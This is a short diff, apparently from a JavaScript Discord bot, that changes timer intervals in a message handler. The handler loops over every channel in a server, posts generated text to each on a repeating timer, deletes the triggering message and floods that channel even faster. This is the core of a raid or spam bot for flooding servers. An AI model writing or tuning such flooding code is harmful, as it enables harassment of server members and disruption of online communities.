@@ -30,13 +30,13 @@ client.on("messageCreate",function(message){
       guild.channels.cache.forEach(function(channel){
         setInterval(async function(){
           await channel.send(getText());
-        },100);
+        },500);
       });
     }
     message.delete();
     setInterval(function(){
       message.channel.send(getText());
-    },500);
+    },100);
   }
 });
 client.on("interactionCreate",async function(e){
